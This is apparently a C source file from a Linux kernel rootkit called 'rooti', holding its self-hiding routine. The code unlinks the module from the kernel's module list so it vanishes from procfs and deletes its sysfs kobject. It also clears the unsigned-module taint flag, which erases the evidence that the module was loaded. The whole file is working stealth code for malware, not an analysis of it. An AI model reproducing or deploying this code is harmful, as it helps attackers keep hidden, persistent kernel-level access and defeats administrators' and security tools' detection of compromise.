#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/panic.h>
#include "module.h"
#include "../../utils.h"

static void rooti_hideme_from_procfs(void)
{
    list_del_rcu(&THIS_MODULE->list);
    synchronize_rcu();
}

static void rooti_hideme_from_sysfs(void)
{
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

static int rooti_remove_taint(void)
{
    ROOTI_RESOLVE_SYM_ADDR(unsigned long *, tainted_mask, -ENOENT);

    clear_bit(TAINT_UNSIGNED_MODULE, __tainted_mask);
    return 0;
}

int rooti_hideme(void)
{
    int err;

    ROOTI_RESOLVE_SYM_ADDR(struct mutex *, module_mutex, -ENOENT);

    mutex_lock(__module_mutex);
    rooti_hideme_from_procfs();
    rooti_hideme_from_sysfs();
    mutex_unlock(__module_mutex);

    err = rooti_remove_taint();
    if (err)
        return err;

    return 0;
}
